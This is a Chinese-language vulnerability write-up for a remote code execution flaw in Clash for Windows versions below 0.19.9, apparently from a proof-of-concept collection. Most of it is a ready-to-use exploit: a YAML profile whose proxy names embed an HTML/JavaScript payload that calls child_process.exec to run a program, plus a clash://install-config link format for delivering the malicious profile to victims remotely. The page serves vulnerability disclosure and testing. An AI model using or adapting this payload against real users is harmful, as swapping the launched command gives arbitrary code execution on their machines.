# Clash_for_Windows

## 来源

[https://github.com/Fndroid/clash_for_windows_pkg/issues/2710](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)

## 介绍

Clash For Windows 是一款基于 Clash 的代理客户端，其广泛应用于 Windows 与 Mac 操作系统。

## 漏洞类型

远程代码执行

## 漏洞影响版本

< v0.19.9

## 漏洞复现


https://github.com/Fndroid/clash_for_windows_pkg/releases

### poc

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>

```

### 本地测试

导入该`poc`

在`Profiles`和`Proxies`中切换至该配置文件

### 远程利用

将恶意配置文件放到互联网上并用于`clash://`安装

```
clash://install-config?url=http%3A%2F%2F1.1.1.1%3A8888%2F1.txt&name=RCE
```

